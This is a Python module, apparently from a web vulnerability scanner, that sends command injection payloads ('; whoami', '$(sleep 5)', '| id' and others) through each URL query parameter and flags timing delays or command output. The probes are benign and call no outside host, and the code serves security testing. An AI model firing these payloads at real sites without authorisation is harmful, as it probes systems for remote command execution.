"""Command Injection Detection Module"""

class CommandInjectionTester:
    def __init__(self):
        self.name = "Command Injection Tester"
    
    def test_command_injection(self, url):
        """Test for OS command injection"""
        import requests
        import time
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        
        vulnerabilities = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Command injection payloads
        payloads = [
            '; whoami',
            '| whoami',
            '|| whoami',
            '& whoami',
            '&& whoami',
            '`whoami`',
            '$(whoami)',
            '; id',
            '| id',
            '; sleep 5',
            '| sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            '; ping -c 5 127.0.0.1',
            '| ping -c 5 127.0.0.1'
        ]
        
        for param in params:
            for payload in payloads:
                test_params = params.copy()
                test_params[param] = [payload]
                test_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
                
                try:
                    # Time-based detection
                    if 'sleep' in payload or 'ping' in payload:
                        start = time.time()
                        response = requests.get(test_url, timeout=15)
                        elapsed = time.time() - start
                        
                        if elapsed > 4:
                            vulnerabilities.append({
                                'type': 'Command Injection (Time-based)',
                                'severity': 'CRITICAL',
                                'description': f'Parameter {param} vulnerable to command injection',
                                'evidence': f'Payload: {payload}, Response time: {elapsed:.2f}s',
                                'url': test_url
                            })
                            break
                    else:
                        # Output-based detection
                        response = requests.get(test_url, timeout=10)
                        
                        if any(indicator in response.text.lower() for indicator in ['uid=', 'gid=', 'root', 'www-data', 'apache']):
                            vulnerabilities.append({
                                'type': 'Command Injection (Output-based)',
                                'severity': 'CRITICAL',
                                'description': f'Parameter {param} vulnerable to command injection',
                                'evidence': f'Payload: {payload}, Command output detected',
                                'url': test_url
                            })
                            break
                
                except Exception:
                    pass
        
        return vulnerabilities
